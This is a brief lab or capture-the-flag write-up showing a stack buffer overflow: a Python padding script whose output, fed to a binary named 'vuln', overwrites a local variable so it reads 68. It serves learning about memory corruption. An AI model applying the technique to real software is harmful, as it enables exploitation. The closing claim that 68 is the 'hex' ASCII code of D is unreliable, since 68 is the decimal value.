I have written a python code to overwrite the 16 char buffer

```python
padding = "A"*16 + "B"*8 + "C"*4
Overflow = "D"
exploit = padding + Overflow
print(exploit)
```
<br><br>
I have executed the code and redirected its output to a txt file named alphabet
```Shell
python3 exploit.py > alphabet
```

<br><br>


if we try to see the content of the file created "alphabet" all you will see is:
```yaml
$cat alphabet
$ AAAAAAAAAAAAAAAABBBBBBBBCCCCD
```

<br><br>

I have executed the binary with alphabet as an entry (it can be done manually)

```bash
./vuln < alphabet
```

<br><br>
And here is the output :)
```yaml
you changed the value of i :)
i = 68
```

```yaml
notice that i=68 is the hex ASCII code of the letter D that overflowed the buffer in the exploit
```
